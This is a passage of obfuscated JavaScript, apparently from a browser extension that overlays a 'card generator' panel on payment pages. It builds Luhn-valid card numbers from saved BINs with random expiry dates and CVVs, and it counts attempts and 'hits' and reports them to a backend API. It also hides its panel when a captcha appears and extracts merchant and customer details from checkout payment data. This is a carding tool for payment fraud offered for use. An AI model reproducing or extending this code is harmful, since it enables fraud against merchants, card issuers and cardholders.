    return savedId || localStorage.getItem(K.USER_ID) || "";
  }
  function saveID(_0x5ce123) {
    savedId = _0x5ce123;
    localStorage.setItem(K.USER_ID, _0x5ce123);
    if (window.tyagreyStorage && window.tyagreyStorage.saveId) {
      window.tyagreyStorage.saveId(_0x5ce123);
    }
    window.postMessage({
      type: "SAVE_ID",
      id: _0x5ce123
    }, "*");
  }
  function saveToggleState(_0x3c6056, _0x30e050) {
    localStorage.setItem("tyagrey_toggle_" + _0x3c6056, _0x30e050);
    if (window.tyagreyStorage && window.tyagreyStorage.saveToggleState) {
      window.tyagreyStorage.saveToggleState(_0x3c6056, _0x30e050);
    }
    window.postMessage({
      type: "SAVE_TOGGLE_STATE",
      toggleType: _0x3c6056,
      value: _0x30e050
    }, "*");
  }
  function generateLuhn(_0x17ce1d) {
    function _0x44c6fa(_0x28ed56) {
      let _0x1b5be3 = 0;
      let _0x317e92 = false;
      for (let _0x2f40bc = _0x28ed56.length - 1; _0x2f40bc >= 0; _0x2f40bc--) {
        let _0x4e03ac = Number.parseInt(_0x28ed56[_0x2f40bc]);
        if (_0x317e92) {
          _0x4e03ac *= 2;
          if (_0x4e03ac > 9) {
            _0x4e03ac -= 9;
          }
        }
        _0x1b5be3 += _0x4e03ac;
        _0x317e92 = !_0x317e92;
      }
      return _0x1b5be3;
    }
    for (let _0xb2264c = 0; _0xb2264c < 10; _0xb2264c++) {
      const _0x4db308 = _0x17ce1d + _0xb2264c;
      if (_0x44c6fa(_0x4db308) % 10 === 0) {
        return _0xb2264c;
      }
    }
    return 0;
  }
  function isAmex(_0x339dc6) {
    const _0x31d097 = _0x339dc6.replace(/[^0-9]/g, "").substring(0, 2);
    return _0x31d097 === "34" || _0x31d097 === "37";
  }
  function generateCard(_0x408ef4, _0x2415dd = null, _0x18a811 = null, _0x5cb886 = null) {
    if (!_0x408ef4) {
      return null;
    }
    let _0x156f60 = _0x408ef4;
    let _0xe4bae0 = null;
    let _0x5e5f04 = null;
    let _0x151c41 = null;
    if (_0x408ef4.includes("|")) {
      const _0x1c57bb = _0x408ef4.split("|");
      _0x156f60 = _0x1c57bb[0];
      _0xe4bae0 = _0x1c57bb[1] || null;
      _0x5e5f04 = _0x1c57bb[2] || null;
      _0x151c41 = _0x1c57bb[3] || null;
    }
    _0x156f60 = _0x156f60.replace(/[^0-9xX]/g, "");
    let _0x12663c = "";
    for (const _0x18bce3 of _0x156f60) {
      _0x12663c += _0x18bce3 === "x" || _0x18bce3 === "X" ? Math.floor(Math.random() * 10) : _0x18bce3;
    }
    const _0xe40e78 = isAmex(_0x156f60) ? 15 : 16;
    const _0x471ee8 = _0xe40e78 - _0x12663c.length - 1;
    for (let _0x4defaa = 0; _0x4defaa < _0x471ee8; _0x4defaa++) {
      _0x12663c += Math.floor(Math.random() * 10);
    }
    const _0x4a3486 = generateLuhn(_0x12663c);
    const _0x230131 = _0x12663c + _0x4a3486;
    let _0x3b0def = _0x2415dd || _0xe4bae0;
    let _0x58bd6e = _0x18a811 || _0x5e5f04;
    let _0x5ed4f2 = _0x5cb886 || _0x151c41;
    if (_0x3b0def === "RND") {
      _0x3b0def = null;
    }
    if (_0x58bd6e === "RND") {
      _0x58bd6e = null;
    }
    if (_0x5ed4f2 === "RND") {
      _0x5ed4f2 = null;
    }
    _0x3b0def = generateMonth(_0x3b0def);
    _0x58bd6e = generateYear(_0x58bd6e);
    _0x5ed4f2 = generateCvv(_0x5ed4f2, _0x230131);
    return {
      card: _0x230131,
      month: _0x3b0def,
      year: _0x58bd6e,
      cvv: _0x5ed4f2
    };
  }
  function generateMonth(_0x1f7f67) {
    if (!_0x1f7f67) {
      return randomMonth();
    }
    _0x1f7f67 = _0x1f7f67.trim();
    if (_0x1f7f67 === "xx" || _0x1f7f67 === "XX") {
      return randomMonth();
    }
    const _0x401d15 = parseInt(_0x1f7f67);
    if (_0x401d15 >= 1 && _0x401d15 <= 12) {
      return String(_0x401d15).padStart(2, "0");
    }
    return randomMonth();
  }
  function generateYear(_0x296062) {
    if (!_0x296062) {
      return randomYear();
    }
    _0x296062 = _0x296062.trim();
    if (_0x296062 === "xx" || _0x296062 === "XX") {
      return randomYear();
    }
    const _0x4355d9 = parseInt(_0x296062);
    if (_0x4355d9 >= 0 && _0x4355d9 <= 99) {
      return String(_0x4355d9).padStart(2, "0");
    }
    if (_0x4355d9 >= 2000 && _0x4355d9 <= 2099) {
      return String(_0x4355d9).slice(-2);
    }
    return randomYear();
  }
  function generateCvv(_0x93bb6c, _0x4d3f6b) {
    if (!_0x93bb6c) {
      return randomCvv(_0x4d3f6b);
    }
    _0x93bb6c = _0x93bb6c.trim().toUpperCase();
    const _0x3d5a8b = isAmex(_0x4d3f6b || "");
    const _0x27fa37 = _0x3d5a8b ? 4 : 3;
    if (_0x93bb6c === "RND" || _0x93bb6c === "RANDOM" || _0x93bb6c === "XXXX" || _0x93bb6c === "XXX" || _0x93bb6c === "XX") {
      return randomCvv(_0x4d3f6b);
    }
    let _0x54e7e3 = "";
    for (const _0x39c0fc of _0x93bb6c) {
      _0x54e7e3 += _0x39c0fc === "X" ? Math.floor(Math.random() * 10) : _0x39c0fc;
    }
    if (_0x54e7e3.length < _0x27fa37) {
      _0x54e7e3 = _0x54e7e3.padStart(_0x27fa37, "0");
    }
    return _0x54e7e3.substring(0, _0x27fa37);
  }
  function randomMonth() {
    const _0x38a400 = new Date();
    const _0x3394d3 = _0x38a400.getMonth() + 1;
    const _0x35bcb8 = _0x38a400.getFullYear();
    const _0x2ca4f8 = _0x35bcb8 + Math.floor(Math.random() * 6) + 1;
    const _0x43e1d8 = _0x2ca4f8 === _0x35bcb8 ? Math.floor(Math.random() * (12 - _0x3394d3 + 1)) + _0x3394d3 : Math.floor(Math.random() * 12) + 1;
    return String(_0x43e1d8).padStart(2, "0");
  }
  function randomYear() {
    const _0x38880d = new Date().getFullYear();
    return String(_0x38880d + Math.floor(Math.random() * 6) + 1).slice(-2);
  }
  function randomCvv(_0x413793) {
    if (isAmex(_0x413793 || "")) {
      return String(Math.floor(Math.random() * 10000)).padStart(4, "0");
    } else {
      return String(Math.floor(Math.random() * 1000)).padStart(3, "0");
    }
  }
  function normalizeBinForComparison(_0x53f929) {
    if (!_0x53f929 || typeof _0x53f929 !== "string") {
      return "";
    }
    return _0x53f929.replace(/[^0-9]/g, "");
  }
  function isDuplicateBin(_0x450a1a, _0x38d41d = -1) {
    if (!_0x450a1a) {
      return false;
    }
    const _0x34408b = normalizeBinForComparison(_0x450a1a);
    if (!_0x34408b) {
      return false;
    }
    const _0xb608de = getPanelBinInputElements();
    let _0x4942b9 = 0;
    _0xb608de.forEach((_0xc34fe, _0x43515a) => {
      if (_0x38d41d >= 0 && _0x43515a === _0x38d41d) {
        return;
      }
      const _0x20f871 = _0xc34fe.value.trim();
      if (_0x20f871 && normalizeBinForComparison(_0x20f871) === _0x34408b) {
        _0x4942b9++;
      }
    });
    return _0x4942b9 > 0;
  }
  function checkBinStatus(_0x547e62) {
    if (!_0x547e62 || typeof _0x547e62 !== "string") {
      return "Stock BIN";
    }
    const _0x19dda7 = normalizeBinForComparison(_0x547e62);
    if (!_0x19dda7) {
      return "Stock BIN";
    }
    const _0x2630fc = savedBINs.some(_0x22fe66 => {
      const _0xb7dd62 = normalizeBinForComparison(_0x22fe66);
      return _0x19dda7 === _0xb7dd62;
    });
    if (_0x2630fc) {
      return "Active BIN";
    } else {
      return "Stock BIN";
    }
  }
  function updateBinStatus() {
    const _0x5ca693 = document.getElementById("binStatus");
    const _0x4cc97c = getSavedBIN();
    if (_0x5ca693) {
      if (_0x4cc97c) {
        const _0x2d68e0 = savedBINs.length > 1 ? "BIN " + (currentBinIndex + 1) + "/" + savedBINs.length + ": " + _0x4cc97c.substring(0, 8) + "..." : "BIN: " + _0x4cc97c.substring(0, 8) + "...";
        _0x5ca693.textContent = _0x2d68e0;
        _0x5ca693.classList.remove("hidden");
        _0x5ca693.classList.add("success");
      } else {
        _0x5ca693.textContent = "";
        _0x5ca693.classList.add("hidden");
        _0x5ca693.classList.remove("success");
      }
    }
  }
  function loadSavedBins() {
    let _0x30c9b7 = [];
    function _0x20ba7f(_0x3cefa7) {
      const _0x188f1f = normalizeBinArray(_0x3cefa7);
      savedBINs = _0x188f1f.slice();
      populateBinInputs();
      updateSwitchBtnVisibility();
    }
    function _0x2974ba() {
      if (typeof sendToBackground !== "function") {
        if (_0x30c9b7.length > 0) {
          savedBINs = _0x30c9b7.slice();
          populateBinInputs();
          updateSwitchBtnVisibility();
        }
        return;
      }
      setBinSyncStatus("Loading panel BINs...", true);
      sendToBackground({
        type: "GET_PANEL_BINS"
      }).then(_0x1b1292 => {
        if (_0x1b1292 && _0x1b1292.success) {
          if (Array.isArray(_0x1b1292.saved_panel_bins)) {
            _0x20ba7f(_0x1b1292.saved_panel_bins);
            return;
          }
          if (Array.isArray(_0x1b1292.panel_bins)) {
            _0x20ba7f(_0x1b1292.panel_bins);
            return;
          }
          if (Array.isArray(_0x1b1292.saved_bins)) {
            _0x20ba7f(_0x1b1292.saved_bins);
            return;
          }
        }
        if (_0x30c9b7.length > 0) {
          savedBINs = _0x30c9b7.slice();
          populateBinInputs();
          updateSwitchBtnVisibility();
        }
      }).catch(() => {
        if (_0x30c9b7.length > 0) {
          savedBINs = _0x30c9b7.slice();
          populateBinInputs();
          updateSwitchBtnVisibility();
        }
      }).finally(() => {
        setBinSyncStatus("", false);
      });
    }
    if (window.tyagreyStorage && window.tyagreyStorage.loadBinStores) {
      window.tyagreyStorage.loadBinStores(function (_0x45dfcd) {
        _0x45dfcd = _0x45dfcd || {};
        const _0x567491 = normalizeBinArray(_0x45dfcd.cloudBins);
        const _0x1abdbf = _0x45dfcd.panelBins;
        if (Array.isArray(_0x1abdbf) && _0x1abdbf.length > 0) {
          _0x30c9b7 = normalizeBinArray(_0x1abdbf);
        } else if (_0x567491.length > 0) {
          _0x30c9b7 = _0x567491.slice();
        }
        _0x2974ba();
      });
    } else if (window.tyagreyStorage && window.tyagreyStorage.loadSavedBINs) {
      window.tyagreyStorage.loadSavedBINs(function (_0x34adc8) {
        const _0x23b549 = normalizeBinArray(_0x34adc8);
        if (_0x23b549.length > 0) {
          _0x30c9b7 = _0x23b549.slice();
        }
        _0x2974ba();
      });
    } else {
      _0x2974ba();
    }
  }
  function populateBinInputs() {
    const _0x1b2e56 = getBinInputsContainerEl();
    if (_0x1b2e56 && savedBINs.length > 0) {
      const _0x156f9c = _0x1b2e56.querySelectorAll(".bin-input-row:not(:first-child)");
      _0x156f9c.forEach(_0x1aff79 => _0x1aff79.remove());
      const _0x3ecabf = document.getElementById("binInput1");
      if (_0x3ecabf) {
        _0x3ecabf.value = savedBINs[0] || "";
        setupBinInputValidation(_0x3ecabf);
      }
      setCurrentBin(getSavedBIN());
      const _0x404bd8 = savedBINs.length;
      for (let _0x6413b4 = 1; _0x6413b4 < _0x404bd8; _0x6413b4++) {
        const _0x500515 = document.createElement("div");
        _0x500515.className = "bin-input-row";
        const _0x48d8b4 = document.createElement("input");
        _0x48d8b4.type = "text";
        _0x48d8b4.className = "input-field bin-input";
        _0x48d8b4.placeholder = "input bin";
        _0x48d8b4.maxLength = "30";
        _0x48d8b4.value = savedBINs[_0x6413b4];
        const _0x53b6a5 = document.createElement("button");
        _0x53b6a5.className = "remove-bin-btn";
        _0x53b6a5.textContent = "−";
        _0x53b6a5.title = "Remove";
        _0x500515.appendChild(_0x48d8b4);
        _0x500515.appendChild(_0x53b6a5);
        setupBinInputValidation(_0x48d8b4);
        _0x53b6a5.addEventListener("click", () => {
          _0x500515.remove();
          const _0x513b08 = _0x1b2e56.querySelectorAll(".bin-input");
          const _0x768728 = Array.from(_0x513b08).map(_0x53ca85 => _0x53ca85.value.trim()).filter(_0x23c115 => _0x23c115 && _0x23c115.length >= 6);
          savePanelBinsLocalOnly(_0x768728);
          currentBinIndex = Math.min(currentBinIndex, Math.max(0, savedBINs.length - 1));
          updateBinStatus();
          updateSwitchBtnVisibility();
        });
        _0x1b2e56.appendChild(_0x500515);
      }
      updateSelectedBinHighlight(false);
    }
    updateSwitchBtnVisibility();
  }
  function setupBinInputValidation(_0x5579d9) {
    if (!_0x5579d9) {
      return;
    }
    _0x5579d9.addEventListener("input", function (_0x2e2d28) {
      let _0x2eefaf = this.value;
      const _0x555d69 = _0x2eefaf.replace(/[^0-9|:xX]/g, "");
      if (_0x2eefaf !== _0x555d69) {
        this.value = _0x555d69;
      }
    });
  }
  function updateSelectedBinHighlight(_0x464b02 = false) {
    const _0x2727cf = getBinInputsContainerEl();
    const _0x401f02 = _0x2727cf ? _0x2727cf.querySelectorAll(".bin-input-row") : [];
    _0x401f02.forEach((_0x280341, _0x4a466a) => {
      _0x280341.classList.remove("bin-selected");
      const _0x10f621 = _0x280341.querySelector(".bin-input");
      if (_0x10f621) {
        _0x10f621.classList.remove("bin-input-selected");
      }
    });
    if (_0x401f02.length > 0 && currentBinIndex < _0x401f02.length) {
      const _0x46cbb4 = _0x401f02[currentBinIndex];
      if (_0x46cbb4) {
        if (_0x464b02) {
          _0x46cbb4.style.animation = "none";
          _0x46cbb4.offsetHeight;
          _0x46cbb4.style.animation = "";
        }
        _0x46cbb4.classList.add("bin-selected");
        const _0x108c10 = _0x46cbb4.querySelector(".bin-input");
        if (_0x108c10) {
          _0x108c10.classList.add("bin-input-selected");
        }
      }
    }
  }
  function updateSwitchBtnVisibility() {
    const _0x510726 = document.getElementById("switchBinBtn");
    const _0x28b76a = getPanelBinInputElements();
    const _0x27efe0 = Array.from(_0x28b76a).filter(_0x4d003c => _0x4d003c.value.trim().length >= 6);
    if (_0x510726) {
      if (_0x27efe0.length > 1 || savedBINs.length > 1) {
        _0x510726.classList.remove("hidden");
      } else {
        _0x510726.classList.add("hidden");
      }
    }
  }
  function updateIdStatus() {
    const _0xfc0938 = document.getElementById("idStatus");
    const _0x4df7fb = getSavedId();
    if (_0xfc0938) {
      if (_0x4df7fb) {
        _0xfc0938.textContent = "ID: " + _0x4df7fb.substring(0, 4) + "...";
        _0xfc0938.classList.remove("hidden");
        _0xfc0938.classList.add("success");
      } else {
        _0xfc0938.textContent = "";
        _0xfc0938.classList.add("hidden");
        _0xfc0938.classList.remove("success");
      }
    }
  }
  function toggleMinimize(_0x1fd1da) {
    const _0xe8070 = document.querySelector(".card-generator-overlay");
    const _0x413562 = document.getElementById("minimizeBtn");
    if (_0xe8070) {
      isMinimized = !isMinimized;
      _0xe8070.classList.toggle("minimized", isMinimized);
      if (_0x413562) {
        _0x413562.innerHTML = isMinimized ? "✦" : "»";
        _0x413562.title = isMinimized ? "Open panel" : "Close panel";
      }
      wasAutoHiddenByCaptcha = false;
      dashboardStateBeforeCaptcha = null;
    }
    if (_0x1fd1da) {
      _0x1fd1da.stopPropagation();
    }
  }
  function autoHideDashboardForCaptcha() {
    const _0x52fb7e = document.querySelector(".card-generator-overlay");
    if (!_0x52fb7e || !isDashboardActive) {
      return;
    }
    if (!isMinimized) {
      dashboardStateBeforeCaptcha = {
        wasMinimized: isMinimized,
        timestamp: Date.now()
      };
      wasAutoHiddenByCaptcha = true;
      isMinimized = true;
      _0x52fb7e.classList.add("minimized");
      const _0x501473 = document.getElementById("minimizeBtn");
      if (_0x501473) {
        _0x501473.innerHTML = "✦";
        _0x501473.title = "Open panel (auto-hidden for captcha)";
      }
    }
  }
  function restoreDashboardAfterCaptcha() {
    const _0x1e37ae = document.querySelector(".card-generator-overlay");
    if (!_0x1e37ae || !isDashboardActive) {
      return;
    }
    if (wasAutoHiddenByCaptcha && dashboardStateBeforeCaptcha) {
      const _0x2ddd17 = Date.now() - dashboardStateBeforeCaptcha.timestamp;
      if (_0x2ddd17 < 300000) {
        if (!dashboardStateBeforeCaptcha.wasMinimized) {
          isMinimized = false;
          _0x1e37ae.classList.remove("minimized");
          const _0x1257c2 = document.getElementById("minimizeBtn");
          if (_0x1257c2) {
            _0x1257c2.innerHTML = "»";
            _0x1257c2.title = "Close panel";
          }
        }
      }
      wasAutoHiddenByCaptcha = false;
      dashboardStateBeforeCaptcha = null;
    }
  }
  let wasAutoMinimizedForModal = false;
  function autoMinimizeForModal() {
    const _0xd83f79 = document.querySelector(".card-generator-overlay");
    if (!_0xd83f79 || !isDashboardActive) {
      return;
    }
    if (!isMinimized) {
      wasAutoMinimizedForModal = true;
      isMinimized = true;
      _0xd83f79.classList.add("minimized");
      const _0x127230 = document.getElementById("minimizeBtn");
      if (_0x127230) {
        _0x127230.innerHTML = "✦";
        _0x127230.title = "Open panel";
      }
    }
  }
  function autoRestoreAfterModal() {
    const _0x2ec88b = document.querySelector(".card-generator-overlay");
    if (!_0x2ec88b || !isDashboardActive) {
      return;
    }
    if (wasAutoMinimizedForModal && isMinimized) {
      isMinimized = false;
      _0x2ec88b.classList.remove("minimized");
      const _0x4a6c11 = document.getElementById("minimizeBtn");
      if (_0x4a6c11) {
        _0x4a6c11.innerHTML = "»";
        _0x4a6c11.title = "Close panel";
      }
    }
    wasAutoMinimizedForModal = false;
  }
  let lastToastMessage = "";
  let lastToastTime = 0;
  const TOAST_DEBOUNCE_MS = 0;
  function showWarning(_0x26a5d3, _0x485526 = "info") {
    const _0xd4eb4d = Date.now();
    if (_0x26a5d3 === lastToastMessage && _0xd4eb4d - lastToastTime < TOAST_DEBOUNCE_MS) {
      return;
    }
    lastToastMessage = _0x26a5d3;
    lastToastTime = _0xd4eb4d;
    if (_0x485526 === "info") {
      if (_0x26a5d3.includes("✅") || _0x26a5d3.includes("success") || _0x26a5d3.includes("Success") || _0x26a5d3.includes("saved") || _0x26a5d3.includes("Saved")) {
        _0x485526 = "success";
      } else if (_0x26a5d3.includes("❌") || _0x26a5d3.includes("error") || _0x26a5d3.includes("Error") || _0x26a5d3.includes("Decline") || _0x26a5d3.includes("decline") || _0x26a5d3.includes("failed")) {
        _0x485526 = "error";
      }
    }
    const _0x14050f = _0x26a5d3.replace(/^[✅❌⚠️ℹ️🎉]\s*/, "").trim();
    const _0x5d107d = {
      success: "✓",
      error: "!",
      info: "i"
    };
    const _0x411677 = document.querySelector(".warning-toast");
    if (_0x411677) {
      _0x411677.classList.remove("show");
      _0x411677.classList.add("hide");
      setTimeout(() => _0x411677.remove(), 400);
    }
    const _0x55915c = document.createElement("div");
    _0x55915c.className = "warning-toast " + _0x485526;
    _0x55915c.style.willChange = "transform, opacity";
    _0x55915c.innerHTML = "<div class=\"toast-icon-wrapper\"><span class=\"toast-icon\">" + _0x5d107d[_0x485526] + "</span></div><div class=\"warning-content\">" + _0x14050f + "</div>";
    document.body.appendChild(_0x55915c);
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        _0x55915c.classList.add("show");
      });
    });
    setTimeout(() => {
      if (_0x55915c.parentNode) {
        _0x55915c.classList.remove("show");
        _0x55915c.classList.add("hide");
        setTimeout(() => _0x55915c.remove(), 400);
      }
    }, 3000);
  }
  function showCardToast(_0x29f0fa, _0x137b57, _0x4af264, _0x17b0c7) {
    const _0x82b8e2 = _0x29f0fa + "|" + _0x137b57 + "|" + _0x4af264 + "|" + _0x17b0c7;
    attemptCount++;
    bumpLocalDashboardCounters(0, 1);
    if (typeof sendToBackground === "function") {
      sendToBackground({
        type: "UPDATE_LOCAL_STATS",
        payload: {
          attempt: true
        }
      });
    }
    const _0x31dc94 = localStorage.getItem(K.TOKEN);
    if (_0x31dc94) {
      sendToBackground({
        type: "API_REQUEST",
        endpoint: "record-attempt",
        payload: {
          token: _0x31dc94
        }
      }).then(_0x48d1da => {
        if (_0x48d1da && _0x48d1da.attempts) {
          userAttemptsCount = _0x48d1da.attempts;
          updateIpBarUserInfo();
        }
      }).catch(_0x3bdf7a => {});
    } else {}
    const _0x5b3e26 = document.querySelector(".card-toast");
    if (_0x5b3e26) {
      _0x5b3e26.classList.add("hide");
      setTimeout(() => _0x5b3e26.remove(), 300);
    }
    const _0x4c7ad0 = document.createElement("div");
    _0x4c7ad0.className = "card-toast";
    _0x4c7ad0.style.willChange = "transform, opacity";
    _0x4c7ad0.innerHTML = "\n    <div class=\"card-toast-icon\">💳</div>\n    <div class=\"card-toast-content\">\n      <div class=\"card-toast-label\">Attempt: " + attemptCount + "</div>\n      <div class=\"card-toast-value\">" + _0x82b8e2 + "</div>\n    </div>\n    <button class=\"card-toast-copy\" title=\"Copy\">📋</button>\n  ";
    document.body.appendChild(_0x4c7ad0);
    const _0x5ef55c = _0x4c7ad0.querySelector(".card-toast-copy");
    _0x5ef55c.addEventListener("click", () => {
      navigator.clipboard.writeText(_0x82b8e2).then(() => {
        _0x5ef55c.textContent = "✓";
        setTimeout(() => _0x5ef55c.textContent = "📋", 1500);
      });
    });
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        _0x4c7ad0.classList.add("show");
      });
    });
    setTimeout(() => {
      if (_0x4c7ad0.parentNode) {
        _0x4c7ad0.classList.remove("show");
        _0x4c7ad0.classList.add("hide");
        setTimeout(() => _0x4c7ad0.remove(), 300);
      }
    }, 3000);
  }
  let hitStartTime = null;
  let hitTimerInterval = null;
  let hitProcessedCount = 0;
  function resetHitStats() {
    hitStartTime = Date.now();
    hitProcessedCount = 0;
    updateHitStatDisplay();
    if (hitTimerInterval) {
      clearInterval(hitTimerInterval);
    }
    hitTimerInterval = setInterval(updateHitTimer, 1000);
  }
  function stopHitStats() {
    if (hitTimerInterval) {
      clearInterval(hitTimerInterval);
      hitTimerInterval = null;
    }
  }
  function incrementHitProcessed() {
    hitProcessedCount++;
    updateHitStatDisplay();
  }
  function updateHitStatDisplay() {
    const _0x393d8a = document.getElementById("hitStatProcessed");
    if (_0x393d8a) {
      _0x393d8a.textContent = hitProcessedCount;
    }
  }
  function updateHitTimer() {
    if (!hitStartTime) {
      return;
    }
    const _0x5f0b93 = Math.floor((Date.now() - hitStartTime) / 1000);
    const _0x21bc5c = Math.floor(_0x5f0b93 / 60);
    const _0x42b794 = _0x5f0b93 % 60;
    const _0x12b219 = String(_0x21bc5c).padStart(2, "0") + ":" + String(_0x42b794).padStart(2, "0");
    const _0x43ec7d = document.getElementById("hitStatTime");
    if (_0x43ec7d) {
      _0x43ec7d.textContent = _0x12b219;
    }
    const _0x44cf12 = _0x5f0b93 / 60;
    const _0x252f02 = _0x44cf12 > 0 ? (hitProcessedCount / _0x44cf12).toFixed(1) : "0.0";
    const _0x5dc42e = document.getElementById("hitStatSpeed");
    if (_0x5dc42e) {
      _0x5dc42e.textContent = _0x252f02 + " /min";
    }
  }
  function createCelebration() {
    createSnowfall();
    createSparkles();
  }
  function createSnowfall() {
    const _0x4c293d = document.createElement("div");
    _0x4c293d.className = "snowfall-container";
    document.body.appendChild(_0x4c293d);
    for (let _0x2f28ee = 0; _0x2f28ee < 60; _0x2f28ee++) {
      const _0x70ef57 = document.createElement("div");
      const _0x402b86 = "pos-" + Math.floor(Math.random() * 20) * 5;
      const _0x1f48f7 = "size-" + ["sm", "md", "lg"][Math.floor(Math.random() * 3)];
      const _0x6d53ee = "delay-" + Math.floor(Math.random() * 5);
      const _0x1c686d = "dur-" + Math.floor(Math.random() * 3);
      const _0xe67b9b = ["white", "gold", "green"][Math.floor(Math.random() * 3)];
      _0x70ef57.className = "snowflake " + _0x402b86 + " " + _0x1f48f7 + " " + _0x6d53ee + " " + _0x1c686d + " " + _0xe67b9b;
      _0x4c293d.appendChild(_0x70ef57);
    }
    setTimeout(() => _0x4c293d.remove(), 12000);
  }
  function createSparkles() {
    const _0x549d77 = document.createElement("div");
    _0x549d77.className = "celebration-container";
    document.body.appendChild(_0x549d77);
    for (let _0xc0b5b6 = 0; _0xc0b5b6 < 30; _0xc0b5b6++) {
      const _0x4bccc9 = document.createElement("div");
      const _0x150ba0 = "sparkle-x-" + Math.floor(Math.random() * 10) * 10;
      const _0x488dc0 = "sparkle-y-" + Math.floor(Math.random() * 10) * 10;
      const _0x1913ac = "sparkle-delay-" + Math.floor(Math.random() * 10);
      _0x4bccc9.className = "sparkle-star " + _0x150ba0 + " " + _0x488dc0 + " " + _0x1913ac;
      _0x549d77.appendChild(_0x4bccc9);
    }
    setTimeout(() => _0x549d77.remove(), 8000);
  }
  const currencySymbols = {
    usd: "$",
    eur: "€",
    gbp: "£",
    jpy: "¥",
    cny: "¥",
    cnh: "¥",
    inr: "₹",
    krw: "₩",
    thb: "฿",
    php: "₱",
    myr: "RM",
    sgd: "S$",
    hkd: "HK$",
    twd: "NT$",
    idr: "Rp",
    vnd: "₫",
    pkr: "₨",
    bdt: "৳",
    lkr: "Rs",
    npr: "Rs",
    mmk: "K",
    khr: "៛",
    lak: "₭",
    chf: "CHF",
    sek: "kr",
    nok: "kr",
    dkk: "kr",
    pln: "zł",
    czk: "Kč",
    huf: "Ft",
    ron: "lei",
    bgn: "лв",
    hrk: "kn",
    rsd: "дин",
    uah: "₴",
    rub: "₽",
    byn: "Br",
    mdl: "L",
    all: "L",
    mkd: "ден",
    bam: "KM",
    isk: "kr",
    cad: "C$",
    mxn: "MX$",
    brl: "R$",
    ars: "AR$",
    clp: "CL$",
    cop: "CO$",
    pen: "S/",
    uyu: "$U",
    pyg: "₲",
    bob: "Bs",
    crc: "₡",
    gtq: "Q",
    hnl: "L",
    nio: "C$",
    pab: "B/.",
    dop: "RD$",
    jmd: "J$",
    ttd: "TT$",
    bbd: "Bds$",
    bsd: "B$",
    kyd: "CI$",
    xcd: "EC$",
    awg: "ƒ",
    ang: "ƒ",
    srd: "Sr$",
    gyd: "G$",
    bzd: "BZ$",
    htg: "G",
    aed: "د.إ",
    sar: "﷼",
    qar: "﷼",
    omr: "﷼",
    bhd: "BD",
    kwd: "KD",
    jod: "JD",
    lbp: "L£",
    egp: "E£",
    ils: "₪",
    try: "₺",
    irr: "﷼",
    iqd: "ع.د",
    syp: "£S",
    yer: "﷼",
    zar: "R",
    ngn: "₦",
    kes: "KSh",
    ugx: "USh",
    tzs: "TSh",
    ghs: "GH₵",
    xof: "CFA",
    xaf: "FCFA",
    mad: "DH",
    dzd: "DA",
    tnd: "DT",
    lyd: "LD",
    etb: "Br",
    rwf: "FRw",
    mur: "Rs",
    scr: "Rs",
    aud: "A$",
    nzd: "NZ$",
    fjd: "FJ$",
    pgk: "K",
    wst: "WS$",
    top: "T$",
    vuv: "VT",
    sbd: "SI$",
    btc: "₿",
    eth: "Ξ",
    xrp: "XRP",
    ltc: "Ł"
  };
  function getCurrencySymbol(_0x4d4945) {
    if (!_0x4d4945) {
      return "$";
    }
    return currencySymbols[_0x4d4945.toLowerCase()] || _0x4d4945.toUpperCase() + " ";
  }
  function extractPaymentData(_0x34bd3d) {
    if (paymentDataFound || !_0x34bd3d || typeof _0x34bd3d !== "object") {
      return;
    }
    function _0x50cff2(_0x238e44, _0x257664) {
      if (!_0x238e44 || typeof _0x238e44 !== "object") {
        return null;
      }
      if (_0x257664 in _0x238e44) {
        return _0x238e44[_0x257664];
      }
      for (const _0x2d22d9 in _0x238e44) {
        if (_0x238e44[_0x2d22d9] && typeof _0x238e44[_0x2d22d9] === "object") {
          const _0xf29657 = _0x50cff2(_0x238e44[_0x2d22d9], _0x257664);
          if (_0xf29657 !== null) {
            return _0xf29657;
          }
        }
      }
      return null;
    }
    function _0x108e98(_0x1045e9) {
      if (!_0x1045e9) {
        return null;
      }
      try {
        let _0x580717 = _0x1045e9.toString().trim();
        _0x580717 = _0x580717.replace(/^https?:\/\//, "");
        _0x580717 = _0x580717.replace(/^www\./, "");
        _0x580717 = _0x580717.split("/")[0];
        _0x580717 = _0x580717.split("?")[0];
        _0x580717 = _0x580717.split("#")[0];
        _0x580717 = _0x580717.split(":")[0];
        return _0x580717 || null;
      } catch (_0x4c233e) {
        return _0x1045e9;
      }
    }
    let _0x43ad32 = false;
    if (!extractedPaymentData.businessUrl) {
      try {
        let _0x569d1c = null;
        if (_0x34bd3d.account_settings?.business_url) {
          _0x569d1c = _0x34bd3d.account_settings.business_url;
        } else if (_0x34bd3d.account_settings?.display_name) {
          _0x569d1c = _0x34bd3d.account_settings.display_name;
        } else if (_0x34bd3d.statement_descriptor) {
          _0x569d1c = _0x34bd3d.statement_descriptor;
        } else {
          _0x569d1c = _0x50cff2(_0x34bd3d, "business_url") || _0x50cff2(_0x34bd3d, "display_name");
        }
        if (_0x569d1c) {
          extractedPaymentData.businessUrl = _0x108e98(_0x569d1c);
          _0x43ad32 = true;
        }
      } catch (_0x1cbaf9) {}
    }
    if (!extractedPaymentData.email) {
      const _0x41648a = _0x34bd3d.customer_email || _0x50cff2(_0x34bd3d, "customer_email");
      if (_0x41648a) {
        extractedPaymentData.email = _0x41648a;
        _0x43ad32 = true;
      }
    }
    if (!extractedPaymentData.successUrl) {
      try {
        let _0x3f1ef7 = null;
        if (_0x34bd3d.success_url) {
          _0x3f1ef7 = _0x34bd3d.success_url;
        } else if (_0x34bd3d.return_url) {
          _0x3f1ef7 = _0x34bd3d.return_url;
        } else if (_0x34bd3d.redirect_url) {
          _0x3f1ef7 = _0x34bd3d.redirect_url;
        } else if (_0x34bd3d.payment_intent?.return_url) {
          _0x3f1ef7 = _0x34bd3d.payment_intent.return_url;
        } else if (_0x34bd3d.confirmation_url) {
          _0x3f1ef7 = _0x34bd3d.confirmation_url;
        } else if (_0x34bd3d.next_action?.redirect_to_url?.url) {
          _0x3f1ef7 = _0x34bd3d.next_action.redirect_to_url.url;
        } else {
          _0x3f1ef7 = _0x50cff2(_0x34bd3d, "success_url");
        }
        if (_0x3f1ef7) {
          extractedPaymentData.successUrl = _0x3f1ef7;
          _0x43ad32 = true;
        }
      } catch (_0x18fdf1) {}
    }
    if (!extractedPaymentData.amount || extractedPaymentData.amount === "0.00" || extractedPaymentData.amount === "0") {
      try {
        let _0x57450e = null;
